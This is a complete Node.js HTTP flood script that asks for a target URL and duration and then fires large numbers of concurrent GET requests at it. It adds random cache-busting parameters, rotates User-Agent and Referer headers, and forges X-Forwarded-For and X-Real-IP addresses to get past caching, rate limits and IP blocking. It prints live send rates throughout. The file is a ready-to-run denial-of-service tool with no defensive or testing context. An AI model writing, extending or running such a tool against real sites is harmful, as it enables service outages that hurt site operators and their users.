const fs = require('fs');
const { request } = require('undici');
const readline = require('readline');
const os = require('os');

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt');

function loadLines(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(Boolean);
    } catch {
        return [];
    }
}

const getRandomIP = () => Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
const getRandom = (arr) => arr[Math.floor(Math.random() * arr.length)] || '';

class FloodEngine {
    constructor(target, duration) {
        this.target = target;
        this.endTime = Date.now() + duration * 1000;

        this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
        this.queue = new Set();
    }

    async floodLoop(concurrency = 1000) {
        const rpsWindow = [];
        const statsInterval = setInterval(() => {
            const now = Date.now();
            const currentRps = rpsWindow.filter(ts => now - ts < 1000).length;
            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);

            process.stdout.write(`\rSENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps}    `);
        }, 1000);

        while (Date.now() < this.endTime) {
            if (this.queue.size >= concurrency) {
                await new Promise(r => setTimeout(r, 5));
                continue;
            }

            const task = this.makeRequest().finally(() => this.queue.delete(task));
            this.queue.add(task);
            rpsWindow.push(Date.now());
        }

        clearInterval(statsInterval);
        await Promise.all(this.queue);
    }

    async makeRequest() {
        const noise = `cb=${Math.random().toString(36).substring(2)}`;
        const url = this.target + (this.target.includes('?') ? '&' : '?') + noise;

        const headers = {
            'User-Agent': getRandom(USER_AGENTS),
            'Referer': getRandom(REFERERS),
            'X-Forwarded-For': getRandomIP(),
            'X-Real-IP': getRandomIP(),
            'Accept': '*/*',
            'Connection': 'keep-alive'
        };

        try {
            const { statusCode } = await request(url, {
                headers,
                method: 'GET',
                throwOnError: false
            });

            this.stats.total++;
            if (statusCode === 200) this.stats.success++;
            else this.stats.errors++;
        } catch {
            this.stats.total++;
            this.stats.errors++;
        }
    }

    printSummary() {
        const duration = (Date.now() - (this.endTime - (this.stats.total * 1000 / this.stats.peakRps))) / 1000;
        const avg = this.stats.total / duration;

        console.log('\n\n=== FLOOD FINISHED ===');
        console.log(`Duration:  ${duration.toFixed(1)}s`);
        console.log(`Total:     ${this.stats.total}`);
        console.log(`200 OK:    ${this.stats.success}`);
        console.log(`Errors:    ${this.stats.errors}`);
        console.log(`Avg RPS:   ${avg.toFixed(1)}`);
        console.log(`Peak RPS:  ${this.stats.peakRps}`);
        console.log('======================\n');
    }
}

(async () => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    const ask = (q) => new Promise(resolve => rl.question(q, resolve));

    let target = await ask('TARGET: ');
    let duration = await ask('DURATION (seconds): ');
    rl.close();

    if (!target.startsWith('http')) target = 'http://' + target;
    duration = parseInt(duration);

    const engine = new FloodEngine(target, duration);
    await engine.floodLoop(os.cpus().length * 50); // clean, high concurrency
    engine.printSummary();
})();
